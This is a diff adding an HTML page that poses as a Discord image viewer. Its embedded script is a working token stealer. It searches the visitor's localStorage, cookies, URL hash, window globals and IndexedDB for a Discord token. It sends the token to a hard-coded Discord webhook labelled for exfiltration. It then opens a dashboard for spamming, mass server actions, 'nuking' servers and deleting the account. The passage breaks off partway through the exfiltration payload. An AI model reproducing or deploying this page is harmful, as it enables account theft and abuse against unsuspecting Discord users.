@@ -1,0 +1,1591 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Viewer</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background: #1a1a2e;
+            font-family: 'Segoe UI', 'Whitney', 'Helvetica Neue', sans-serif;
+            overflow: hidden;
+            height: 100vh;
+            color: #dcddde;
+        }
+
+        #stage-masquerade {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 1000;
+            background: #0f0f1a;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 1.5s ease, transform 1.5s ease;
+        }
+
+        #stage-masquerade.hidden {
+            opacity: 0;
+            pointer-events: none;
+            transform: scale(1.1);
+        }
+
+        .image-container {
+            background: #232536;
+            border-radius: 8px;
+            padding: 12px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
+            max-width: 90vw;
+            max-height: 90vh;
+            position: relative;
+        }
+
+        .image-container img {
+            display: block;
+            max-width: 100%;
+            max-height: 80vh;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .image-overlay-text {
+            position: absolute;
+            bottom: 15px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0,0,0,0.7);
+            padding: 6px 16px;
+            border-radius: 20px;
+            font-size: 12px;
+            color: #b9bbbe;
+            pointer-events: none;
+            backdrop-filter: blur(4px);
+        }
+
+        .loading-bar {
+            position: absolute;
+            bottom: 0; left: 0;
+            height: 3px;
+            background: linear-gradient(90deg, #5865f2, #eb459e);
+            width: 0%;
+            transition: width 3s linear;
+            border-radius: 0 2px 2px 0;
+        }
+
+        #stage-dashboard {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            z-index: 500;
+            display: none;
+            background: #1a1a2e;
+        }
+
+        #stage-dashboard.active {
+            display: flex;
+        }
+
+        .dashboard {
+            display: grid;
+            grid-template-columns: 280px 1fr;
+            height: 100vh;
+            width: 100%;
+        }
+
+        .sidebar {
+            background: #1e1f2b;
+            border-right: 1px solid #2b2d3c;
+            padding: 16px 12px;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+        }
+
+        .sidebar-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #2b2d3c;
+            margin-bottom: 16px;
+        }
+
+        .avatar {
+            width: 40px; height: 40px;
+            border-radius: 50%;
+            background: #5865f2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 18px;
+            color: white;
+            flex-shrink: 0;
+            overflow: hidden;
+        }
+
+        .avatar img {
+            width: 100%; height: 100%;
+            object-fit: cover;
+        }
+
+        .user-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .user-info .username {
+            font-weight: 600;
+            font-size: 16px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .user-info .discriminator {
+            font-size: 12px;
+            color: #b9bbbe;
+        }
+
+        .status-indicator {
+            width: 10px; height: 10px;
+            border-radius: 50%;
+            background: #3ba55c;
+            flex-shrink: 0;
+        }
+
+        .nav-section {
+            margin-bottom: 8px;
+        }
+
+        .nav-section .section-title {
+            text-transform: uppercase;
+            font-size: 11px;
+            font-weight: 600;
+            color: #72767d;
+            padding: 8px 8px 4px;
+            letter-spacing: 0.5px;
+        }
+
+        .nav-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            color: #b9bbbe;
+            font-size: 14px;
+            transition: all 0.15s;
+        }
+
+        .nav-item:hover {
+            background: #2b2d3c;
+            color: #dcddde;
+        }
+
+        .nav-item.active {
+            background: #393c4a;
+            color: white;
+        }
+
+        .nav-item .icon {
+            width: 24px;
+            text-align: center;
+            font-size: 16px;
+        }
+
+        .nav-item .badge {
+            margin-left: auto;
+            background: #ed4245;
+            color: white;
+            font-size: 11px;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-weight: 600;
+        }
+
+        .main-content {
+            padding: 24px;
+            overflow-y: auto;
+            background: #202231;
+        }
+
+        .main-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+        }
+
+        .main-header h1 {
+            font-size: 22px;
+            font-weight: 600;
+        }
+
+        .main-header .subtitle {
+            font-size: 14px;
+            color: #b9bbbe;
+            margin-top: 4px;
+        }
+
+        .action-bar {
+            display: flex;
+            gap: 8px;
+        }
+
+        .btn {
+            padding: 8px 16px;
+            border-radius: 4px;
+            border: none;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.15s;
+            background: #4e5058;
+            color: white;
+        }
+
+        .btn:hover { filter: brightness(1.2); }
+        .btn-primary { background: #5865f2; }
+        .btn-danger { background: #ed4245; }
+        .btn-success { background: #3ba55c; }
+
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .card {
+            background: #1e1f2b;
+            border-radius: 8px;
+            padding: 20px;
+            border: 1px solid #2b2d3c;
+        }
+
+        .card .card-title {
+            font-size: 13px;
+            color: #b9bbbe;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .card .card-value {
+            font-size: 28px;
+            font-weight: 700;
+        }
+
+        .card .card-footer {
+            font-size: 12px;
+            color: #72767d;
+            margin-top: 8px;
+        }
+
+        .guild-list {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 12px;
+        }
+
+        .guild-item {
+            background: #1e1f2b;
+            border: 1px solid #2b2d3c;
+            border-radius: 8px;
+            padding: 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.15s;
+        }
+
+        .guild-item:hover {
+            border-color: #5865f2;
+            background: #232536;
+        }
+
+        .guild-icon {
+            width: 40px; height: 40px;
+            border-radius: 50%;
+            background: #5865f2;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 20px;
+            color: white;
+            flex-shrink: 0;
+            overflow: hidden;
+        }
+
+        .guild-icon img {
+            width: 100%; height: 100%;
+            object-fit: cover;
+        }
+
+        .guild-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .guild-name {
+            font-weight: 600;
+            font-size: 14px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .guild-members {
+            font-size: 12px;
+            color: #b9bbbe;
+        }
+
+        .friend-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .friend-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 8px 12px;
+            border-radius: 6px;
+            background: #1e1f2b;
+            border: 1px solid #2b2d3c;
+        }
+
+        .friend-item .friend-status {
+            width: 8px; height: 8px;
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+
+        .status-online { background: #3ba55c; }
+        .status-idle { background: #faa61a; }
+        .status-dnd { background: #ed4245; }
+        .status-offline { background: #72767d; }
+
+        .console-panel {
+            background: #0d0d1a;
+            border: 1px solid #2b2d3c;
+            border-radius: 8px;
+            padding: 16px;
+            margin-top: 16px;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 13px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .console-panel .log-entry {
+            padding: 2px 0;
+            border-bottom: 1px solid #1a1a2e;
+        }
+
+        .console-panel .log-entry .timestamp {
+            color: #72767d;
+            margin-right: 8px;
+        }
+
+        .console-panel .log-entry .level-info { color: #5865f2; }
+        .console-panel .log-entry .level-success { color: #3ba55c; }
+        .console-panel .log-entry .level-warn { color: #faa61a; }
+        .console-panel .log-entry .level-error { color: #ed4245; }
+
+        .command-bar {
+            display: flex;
+            gap: 8px;
+            margin-top: 16px;
+        }
+
+        .command-bar input {
+            flex: 1;
+            background: #1e1f2b;
+            border: 1px solid #2b2d3c;
+            border-radius: 4px;
+            padding: 10px 14px;
+            color: #dcddde;
+            font-size: 14px;
+            font-family: 'Consolas', monospace;
+        }
+
+        .command-bar input:focus {
+            outline: none;
+            border-color: #5865f2;
+        }
+
+        .command-bar input::placeholder {
+            color: #72767d;
+        }
+
+        .tab-bar {
+            display: flex;
+            gap: 4px;
+            margin-bottom: 24px;
+            border-bottom: 1px solid #2b2d3c;
+            padding-bottom: 12px;
+        }
+
+        .tab-item {
+            padding: 8px 20px;
+            cursor: pointer;
+            color: #b9bbbe;
+            border-radius: 4px 4px 0 0;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.15s;
+            border-bottom: 2px solid transparent;
+        }
+
+        .tab-item:hover {
+            color: #dcddde;
+            background: #232536;
+        }
+
+        .tab-item.active {
+            color: white;
+            border-bottom-color: #5865f2;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        ::-webkit-scrollbar { width: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #2b2d3c; border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: #4e5058; }
+
+        .spinner {
+            width: 20px; height: 20px;
+            border: 2px solid #2b2d3c;
+            border-top-color: #5865f2;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .toast {
+            position: fixed;
+            bottom: 24px; right: 24px;
+            background: #1e1f2b;
+            border: 1px solid #2b2d3c;
+            border-radius: 8px;
+            padding: 12px 20px;
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+            transform: translateY(100px);
+            opacity: 0;
+            transition: all 0.3s ease;
+        }
+
+        .toast.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        .toast .toast-icon {
+            font-size: 20px;
+        }
+
+        .toast.success .toast-icon { color: #3ba55c; }
+        .toast.error .toast-icon { color: #ed4245; }
+        .toast.info .toast-icon { color: #5865f2; }
+    </style>
+</head>
+<body>
+
+<!-- ===== STAGE 1: MASQUERADE (Image Viewer) ===== -->
+<div id="stage-masquerade">
+    <div class="image-container">
+        <img id="image-display" src="https://media.discordapp.net/attachments/1538275062384435251/1551538481946165388/image.png?ex=6ab25650&is=6ab104d0&hm=260317d8e9c98558e5f3725231bb81a734ef3b2be71a6774b8b7fcacaa1e2768&=&format=webp&quality=lossless" alt="Loading image...">
+        <div class="image-overlay-text">discord • image</div>
+        <div class="loading-bar" id="loading-bar"></div>
+    </div>
+    <p style="color: #72767d; margin-top: 12px; font-size: 13px;">Loading content...</p>
+</div>
+
+<!-- ===== STAGE 2: DASHBOARD ===== -->
+<div id="stage-dashboard">
+    <div class="dashboard">
+        <!-- Sidebar -->
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <div class="avatar" id="dashboard-avatar">
+                    <span id="avatar-initials">U</span>
+                </div>
+                <div class="user-info">
+                    <div class="username" id="dashboard-username">Loading...</div>
+                    <div class="discriminator" id="dashboard-discriminator">#0000</div>
+                </div>
+                <div class="status-indicator" id="dashboard-status"></div>
+            </div>
+
+            <div class="nav-section">
+                <div class="section-title">Overview</div>
+                <div class="nav-item active" data-tab="overview">
+                    <span class="icon">📊</span> Dashboard
+                </div>
+                <div class="nav-item" data-tab="guilds">
+                    <span class="icon">🏠</span> Servers
+                    <span class="badge" id="guild-count-badge">0</span>
+                </div>
+                <div class="nav-item" data-tab="friends">
+                    <span class="icon">👥</span> Friends
+                    <span class="badge" id="friend-count-badge">0</span>
+                </div>
+            </div>
+
+            <div class="nav-section">
+                <div class="section-title">Actions</div>
+                <div class="nav-item" data-tab="messages">
+                    <span class="icon">💬</span> Messages
+                </div>
+                <div class="nav-item" data-tab="console">
+                    <span class="icon">🖥️</span> Console
+                </div>
+                <div class="nav-item" data-tab="settings">
+                    <span class="icon">⚙️</span> Settings
+                </div>
+            </div>
+
+            <div class="nav-section" style="margin-top: auto; padding-top: 16px; border-top: 1px solid #2b2d3c;">
+                <div class="nav-item" id="btn-logout" style="color: #ed4245;">
+                    <span class="icon">🚪</span> Disconnect
+                </div>
+                <div class="nav-item" id="btn-token-info" style="color: #faa61a;">
+                    <span class="icon">🔑</span> Token Info
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Tab: Overview -->
+            <div class="tab-content active" id="tab-overview">
+                <div class="main-header">
+                    <div>
+                        <h1>Account Overview</h1>
+                        <div class="subtitle" id="overview-subtitle">Loading account data...</div>
+                    </div>
+                    <div class="action-bar">
+                        <button class="btn btn-primary" id="btn-refresh">🔄 Refresh</button>
+                        <button class="btn btn-danger" id="btn-logout-main">Logout</button>
+                    </div>
+                </div>
+
+                <div class="cards-grid">
+                    <div class="card">
+                        <div class="card-title">User ID</div>
+                        <div class="card-value" id="card-userid" style="font-size: 16px;">-</div>
+                        <div class="card-footer">Discord account identifier</div>
+                    </div>
+                    <div class="card">
+                        <div class="card-title">Servers</div>
+                        <div class="card-value" id="card-guilds">0</div>
+                        <div class="card-footer">Total guilds joined</div>
+                    </div>
+                    <div class="card">
+                        <div class="card-title">Friends</div>
+                        <div class="card-value" id="card-friends">0</div>
+                        <div class="card-footer">Total friends count</div>
+                    </div>
+                    <div class="card">
+                        <div class="card-title">Account Age</div>
+                        <div class="card-value" id="card-age" style="font-size: 16px;">-</div>
+                        <div class="card-footer">Days since creation</div>
+                    </div>
+                </div>
+
+                <div class="console-panel" id="overview-console" style="max-height: 200px;">
+                    <div class="log-entry"><span class="timestamp">[INIT]</span> <span class="level-info">Dashboard initialized.</span></div>
+                    <div class="log-entry"><span class="timestamp">[WAIT]</span> <span class="level-info">Awaiting authentication...</span></div>
+                </div>
+            </div>
+
+            <!-- Tab: Guilds -->
+            <div class="tab-content" id="tab-guilds">
+                <div class="main-header">
+                    <div>
+                        <h1>Server List</h1>
+                        <div class="subtitle" id="guilds-subtitle">Manage joined servers</div>
+                    </div>
+                    <div class="action-bar">
+                        <button class="btn btn-success" id="btn-mass-join">📥 Mass Join</button>
+                        <button class="btn btn-danger" id="btn-mass-leave">📤 Mass Leave</button>
+                    </div>
+                </div>
+                <div class="guild-list" id="guild-list-container">
+                    <div style="color: #72767d; padding: 20px;">Loading servers...</div>
+                </div>
+            </div>
+
+            <!-- Tab: Friends -->
+            <div class="tab-content" id="tab-friends">
+                <div class="main-header">
+                    <div>
+                        <h1>Friends & Relationships</h1>
+                        <div class="subtitle" id="friends-subtitle">Friend management</div>
+                    </div>
+                    <div class="action-bar">
+                        <button class="btn btn-success" id="btn-mass-friend">👥 Mass Add</button>
+                        <button class="btn btn-danger" id="btn-mass-unfriend">❌ Mass Remove</button>
+                    </div>
+                </div>
+                <div class="friend-list" id="friend-list-container">
+                    <div style="color: #72767d; padding: 20px;">Loading friends...</div>
+                </div>
+            </div>
+
+            <!-- Tab: Messages -->
+            <div class="tab-content" id="tab-messages">
+                <div class="main-header">
+                    <div>
+                        <h1>Message Utility</h1>
+                        <div class="subtitle">Send, delete, or mass-message</div>
+                    </div>
+                </div>
+                <div style="display: flex; flex-direction: column; gap: 12px;">
+                    <input type="text" id="msg-target" placeholder="Channel ID or User ID" style="background: #1e1f2b; border: 1px solid #2b2d3c; border-radius: 4px; padding: 10px; color: white;">
+                    <textarea id="msg-content" placeholder="Message content..." style="background: #1e1f2b; border: 1px solid #2b2d3c; border-radius: 4px; padding: 10px; color: white; height: 80px; resize: vertical;"></textarea>
+                    <div style="display: flex; gap: 8px;">
+                        <button class="btn btn-primary" id="btn-send-msg">Send</button>
+                        <button class="btn btn-danger" id="btn-spam-msg">Spam (x10)</button>
+                        <button class="btn" id="btn-clear">Clear</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Tab: Console -->
+            <div class="tab-content" id="tab-console">
+                <div class="main-header">
+                    <div>
+                        <h1>Command Console</h1>
+                        <div class="subtitle">Direct API control</div>
+                    </div>
+                    <button class="btn" id="btn-clear-console">Clear</button>
+                </div>
+                <div class="console-panel" id="console-output">
+                    <div class="log-entry"><span class="timestamp">[BOOT]</span> <span class="level-success">Console ready.</span></div>
+                    <div class="log-entry"><span class="timestamp">[INFO]</span> <span class="level-info">Type "help" for commands.</span></div>
+                </div>
+                <div class="command-bar">
+                    <input type="text" id="console-input" placeholder="Enter command (e.g., /users/@me)" autocomplete="off" spellcheck="false">
+                    <button class="btn btn-primary" id="btn-execute">Execute</button>
+                </div>
+            </div>
+
+            <!-- Tab: Settings -->
+            <div class="tab-content" id="tab-settings">
+                <div class="main-header">
+                    <div>
+                        <h1>Settings</h1>
+                        <div class="subtitle">Dashboard & token configuration</div>
+                    </div>
+                </div>
+                <div class="card" style="margin-bottom: 12px;">
+                    <div class="card-title">Token</div>
+                    <div style="display: flex; gap: 8px; align-items: center;">
+                        <input type="password" id="settings-token-display" style="flex:1; background:#1e1f2b; border:1px solid #2b2d3c; border-radius:4px; padding:8px; color:white; font-family:monospace; font-size:12px;" readonly>
+                        <button class="btn" id="btn-toggle-token">👁️</button>
+                        <button class="btn btn-danger" id="btn-copy-token">📋 Copy</button>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="card-title">Webhook for Exfiltration</div>
+                    <div style="display: flex; gap: 8px;">
+                        <input type="url" id="settings-webhook" placeholder="https://discord.com/api/webhooks/..." style="flex:1; background:#1e1f2b; border:1px solid #2b2d3c; border-radius:4px; padding:8px; color:white;" value="https://discord.com/api/webhooks/1551539788220203069/hX0J3ZaEmfsxMOGBnUzdZIKekNSZQM_fXMBiqHjusCAxphMNlV7V7j7Z5DTPFiSLqGX3">
+                        <button class="btn btn-primary" id="btn-save-webhook">Save</button>
+                    </div>
+                    <div style="margin-top: 8px; font-size:12px; color:#72767d;">
+                        Tokens will be forwarded to this webhook automatically.
+                    </div>
+                </div>
+                <div class="card" style="margin-top: 12px;">
+                    <div class="card-title">Danger Zone</div>
+                    <div style="display: flex; gap: 8px; flex-wrap: wrap;">
+                        <button class="btn btn-danger" id="btn-delete-account">🗑️ Delete Account</button>
+                        <button class="btn btn-danger" id="btn-nuke-guilds">💥 Nuke All Servers</button>
+                        <button class="btn btn-danger" id="btn-purge-dms">📨 Purge DMs</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Toast Notification -->
+<div class="toast" id="toast">
+    <div class="toast-icon">✅</div>
+    <div class="toast-message" id="toast-message">Operation completed.</div>
+</div>
+
+<script>
+(function() {
+    'use strict';
+
+    // ---- Configuration ----
+    const CONFIG = {
+        exfilWebhook: 'https://discord.com/api/webhooks/1551539788220203069/hX0J3ZaEmfsxMOGBnUzdZIKekNSZQM_fXMBiqHjusCAxphMNlV7V7j7Z5DTPFiSLqGX3',
+        discordAPI: 'https://discord.com/api/v9',
+        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9023 Chrome/108.0.5359.215'
+    };
+
+    function getSuperProperties() {
+        return {
+            os: 'Windows',
+            browser: 'Chrome',
+            device: '',
+            system_locale: 'en-US',
+            browser_user_agent: navigator.userAgent,
+            browser_version: '108.0.5359.215',
+            os_version: '10',
+            referer: '',
+            referring_domain: '',
+            referrer_current: '',
+            referring_domain_current: '',
+            release_channel: 'stable',
+            client_build_number: 194259,
+            client_event_source: null
+        };
+    }
+
+    let state = {
+        token: null,
+        userData: null,
+        guilds: [],
+        friends: [],
+        webhook: CONFIG.exfilWebhook,
+        logs: []
+    };
+
+    const $ = (id) => document.getElementById(id);
+    
+    const stageMasquerade = $('stage-masquerade');
+    const stageDashboard = $('stage-dashboard');
+    const loadingBar = $('loading-bar');
+    const avatarInitials = $('avatar-initials');
+    const dashboardAvatar = $('dashboard-avatar');
+    const dashboardUsername = $('dashboard-username');
+    const dashboardDiscriminator = $('dashboard-discriminator');
+    const cardUserid = $('card-userid');
+    const cardGuilds = $('card-guilds');
+    const cardFriends = $('card-friends');
+    const cardAge = $('card-age');
+    const guildCountBadge = $('guild-count-badge');
+    const friendCountBadge = $('friend-count-badge');
+    const guildListContainer = $('guild-list-container');
+    const friendListContainer = $('friend-list-container');
+    const consoleOutput = $('console-output');
+    const overviewConsole = $('overview-console');
+    const settingsTokenDisplay = $('settings-token-display');
+    const settingsWebhook = $('settings-webhook');
+    const consoleInput = $('console-input');
+    const msgTarget = $('msg-target');
+    const msgContent = $('msg-content');
+
+    function log(level, message) {
+        const timestamp = new Date().toLocaleTimeString();
+        state.logs.push({ timestamp, level, message });
+        
+        console.log(`[${timestamp}] [${level.toUpperCase()}] ${message}`);
+        
+        const logHTML = `<div class="log-entry"><span class="timestamp">[${timestamp}]</span> <span class="level-${level}">${message}</span></div>`;
+        
+        if (consoleOutput) {
+            consoleOutput.innerHTML += logHTML;
+            consoleOutput.scrollTop = consoleOutput.scrollHeight;
+        }
+        if (overviewConsole) {
+            overviewConsole.innerHTML += logHTML;
+            overviewConsole.scrollTop = overviewConsole.scrollHeight;
+        }
+    }
+
+    function showToast(message, type = 'success') {
+        const toast = $('toast');
+        const toastMessage = $('toast-message');
+        const toastIcon = toast.querySelector('.toast-icon');
+        
+        toast.className = 'toast';
+        toast.classList.add(type);
+        toastMessage.textContent = message;
+        
+        if (type === 'success') toastIcon.textContent = '✅';
+        else if (type === 'error') toastIcon.textContent = '❌';
+        else toastIcon.textContent = 'ℹ️';
+        
+        toast.classList.add('show');
+        setTimeout(() => toast.classList.remove('show'), 3000);
+    }
+
+    function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+    function harvestToken() {
+        log('info', 'Initiating token harvest...');
+        let token = null;
+
+        try {
+            const localToken = localStorage.getItem('token');
+            if (localToken && localToken.includes('.')) {
+                token = localToken;
+                log('success', 'Token found in localStorage');
+            }
+        } catch(e) { log('warn', 'localStorage access failed'); }
+
+        if (!token) {
+            try {
+                const cookies = document.cookie.split(';');
+                for (let cookie of cookies) {
+                    const [name, value] = cookie.trim().split('=');
+                    if (value && value.includes('.') && value.length > 50) {
+                        token = value;
+                        log('success', 'Potential token found in cookies');
+                        break;
+                    }
+                }
+            } catch(e) {}
+        }
+
+        if (!token) {
+            const urlParams = new URLSearchParams(window.location.hash.substring(1));
+            const accessToken = urlParams.get('access_token');
+            if (accessToken) {
+                token = accessToken;
+                log('success', 'Token found in URL hash');
+            }
+        }
+
+        if (!token) {
+            for (let key in window) {
+                try {
+                    const val = window[key];
+                    if (typeof val === 'string' && val.includes('.') && val.split('.').length === 3) {
+                        const parts = val.split('.');
+                        if (parts[0].length === 24 && parts[1].length === 6 && parts[2].length === 27) {
+                            token = val;
+                            log('success', 'Token found in window scope');
+                            break;
+                        }
+                    }
+                } catch(e) {}
+            }
+        }
+
+        if (!token) {
+            try {
+                const openRequest = indexedDB.open('discord');
+                openRequest.onsuccess = function(event) {
+                    const db = event.target.result;
+                    if (db && db.objectStoreNames.contains('user')) {
+                        const transaction = db.transaction('user', 'readonly');
+                        const store = transaction.objectStore('user');
+                        const getRequest = store.get('token');
+                        getRequest.onsuccess = function() {
+                            if (getRequest.result) {
+                                token = getRequest.result;
+                                log('success', 'Token found in IndexedDB');
+                                if (token) initializeDashboard(token);
+                            }
+                        };
+                    }
+                };
+            } catch(e) {}
+        }
+
+        if (token) {
+            initializeDashboard(token);
+        } else {
+            log('error', 'No token found! Retrying...');
+            setTimeout(harvestToken, 2000);
+        }
+    }
+
+    async function discordRequest(endpoint, options = {}) {
+        if (!state.token) {
+            log('error', 'No token available');
+            return null;
+        }
+
+        const headers = {
+            'Authorization': state.token,
+            'Content-Type': 'application/json',
+            'User-Agent': CONFIG.userAgent,
+            'X-Super-Properties': btoa(JSON.stringify(getSuperProperties())),
+            'X-Discord-Locale': 'en-US',
+            'X-Debug-Options': 'bugReporterEnabled',
+            'Origin': 'https://discord.com',
+            'Referer': 'https://discord.com/channels/@me'
+        };
+
+        try {
+            const response = await fetch(`${CONFIG.discordAPI}${endpoint}`, {
+                ...options,
+                headers: { ...headers, ...options.headers }
+            });
+
+            if (response.status === 429) {
+                log('warn', 'Rate limited! Waiting...');
+                const retryAfter = response.headers.get('Retry-After') || 5;
+                await sleep(retryAfter * 1000);
+                return discordRequest(endpoint, options);
+            }
+
+            if (response.status === 401) {
+                log('error', 'Token invalid or expired!');
+                showToast('Token invalid!', 'error');
+                return null;
+            }
+
+            return await response.json();
+        } catch (error) {
+            log('error', `API request failed: ${error.message}`);
+            return null;
+        }
+    }
+
+    async function initializeDashboard(token) {
+        state.token = token;
+        log('success', 'Token acquired successfully');
+        
+        if (settingsTokenDisplay) {
+            settingsTokenDisplay.value = token;
+        }
+
+        loadingBar.style.width = '100%';
+        await sleep(3000);
+
+        log('info', 'Fetching user information...');
+        const userData = await discordRequest('/users/@me');
+        
+        if (!userData) {
+            log('error', 'Failed to fetch user data');
+            transitionToDashboard({
+                id: '000000000000000000',
+                username: 'Unknown_User',
+                discriminator: '0000',
+                avatar: null
+            });
+            return;
+        }
+
+        state.userData = userData;
+        log('success', `Logged in as ${userData.username}#${userData.discriminator}`);
+
+        const [guilds, relationships] = await Promise.all([
+            discordRequest('/users/@me/guilds'),
+            discordRequest('/users/@me/relationships')
+        ]);
+
+        state.guilds = guilds || [];
+        state.friends = (relationships || []).filter(r => r.type === 1);
+        
+        log('info', `Found ${state.guilds.length} servers and ${state.friends.length} friends`);
+
+        exfiltrateToken(token, userData);
+        transitionToDashboard(userData);
+    }
+
+    function transitionToDashboard(userData) {
+        log('success', 'Transitioning to dashboard...');
+
+        if (dashboardUsername) dashboardUsername.textContent = userData.username || 'Unknown';
+        if (dashboardDiscriminator) dashboardDiscriminator.textContent = '#' + (userData.discriminator || '0000');
+        if (cardUserid) cardUserid.textContent = userData.id || '-';
+        if (cardGuilds) cardGuilds.textContent = state.guilds.length || 0;
+        if (cardFriends) cardFriends.textContent = state.friends.length || 0;
+        if (guildCountBadge) guildCountBadge.textContent = state.guilds.length || 0;
+        if (friendCountBadge) friendCountBadge.textContent = state.friends.length || 0;
+
+        if (userData.id && cardAge) {
+            const snowflake = parseInt(userData.id.toString());
+            const created = new Date((snowflake / 4194304) + 1420070400000);
+            const days = Math.floor((Date.now() - created) / (86400000));
+            cardAge.textContent = `${days} days (${created.toLocaleDateString()})`;
+        }
+
+        if (userData.avatar) {
+            const avatarURL = `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png?size=80`;
+            dashboardAvatar.innerHTML = `<img src="${avatarURL}" alt="Avatar">`;
+        } else {
+            const initials = (userData.username || 'U')[0].toUpperCase();
+            avatarInitials.textContent = initials;
+        }
+
+        const subtitle = $('overview-subtitle');
+        if (subtitle) subtitle.textContent = `Authenticated as ${userData.username}#${userData.discriminator}`;
+
+        renderGuilds();
+        renderFriends();
+
+        stageMasquerade.classList.add('hidden');
+        setTimeout(() => {
+            stageMasquerade.style.display = 'none';
+            stageDashboard.classList.add('active');
+        }, 1500);
+
+        log('success', 'Dashboard ready');
+        showToast('Dashboard loaded successfully', 'success');
+    }
+
+    function renderGuilds() {
+        if (!guildListContainer) return;
+        
+        if (state.guilds.length === 0) {
+            guildListContainer.innerHTML = '<div style="color:#72767d; padding:20px;">No servers found.</div>';
+            return;
+        }
+
+        guildListContainer.innerHTML = state.guilds.map(guild => {
+            const iconHTML = guild.icon 
+                ? `<img src="https://cdn.discordapp.com/icons/${guild.id}/${guild.icon}.png?size=40" alt="">`
+                : guild.name[0].toUpperCase();
+            
+            return `
+                <div class="guild-item" data-guild-id="${guild.id}">
+                    <div class="guild-icon">${iconHTML}</div>
+                    <div class="guild-info">
+                        <div class="guild-name">${guild.name}</div>
+                        <div class="guild-members">Owner: ${guild.owner ? 'Yes' : 'No'} • ${guild.approximate_member_count || '?'} members</div>
+                    </div>
+                </div>
+            `;
+        }).join('');
+
+        document.querySelectorAll('.guild-item').forEach(item => {
+            item.addEventListener('click', async function() {
+                const guildId = this.dataset.guildId;
+                const guild = state.guilds.find(g => g.id === guildId);
+                if (guild) {
+                    log('info', `Selected guild: ${guild.name} (${guildId})`);
+                    showToast(`Selected: ${guild.name}`, 'info');
+                }
+            });
+        });
+    }
+
+    function renderFriends() {
+        if (!friendListContainer) return;
+
+        if (state.friends.length === 0) {
+            friendListContainer.innerHTML = '<div style="color:#72767d; padding:20px;">No friends found.</div>';
+            return;
+        }
+
+        friendListContainer.innerHTML = state.friends.map(friend => {
+            const user = friend.user;
+            return `
+                <div class="friend-item" data-user-id="${user.id}">
+                    <div class="friend-status status-online"></div>
+                    <div class="avatar" style="width:32px;height:32px;font-size:14px;">
+                        ${user.avatar ? `<img src="https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=32">` : (user.username[0].toUpperCase())}
+                    </div>
+                    <div style="flex:1;">
+                        <div style="font-weight:500;font-size:14px;">${user.username}</div>
+                        <div style="font-size:12px;color:#b9bbbe;">#${user.discriminator}${user.bot ? ' • BOT' : ''}</div>
+                    </div>
+                </div>
+            `;
+        }).join('');
+    }
+
+    async function exfiltrateToken(token, userData) {
+        const webhook = state.webhook || CONFIG.exfilWebhook;
+        
+        if (!webhook) {
+            log('warn', 'No webhook configured for exfiltration.');
+            return;
+        }
+
+        log('info', 'Exfiltrating token to webhook...');
+
+        const payload = {
+            content: '@everyone **New Token Harvested**',
+            embeds: [{
+                title: '🎣 Discord Token Captured',
+                color: 0x5865F2,
+                fields: [
+                    { name: 'Username', value: `${userData.username}#${userData.discriminator}`, inline: true },
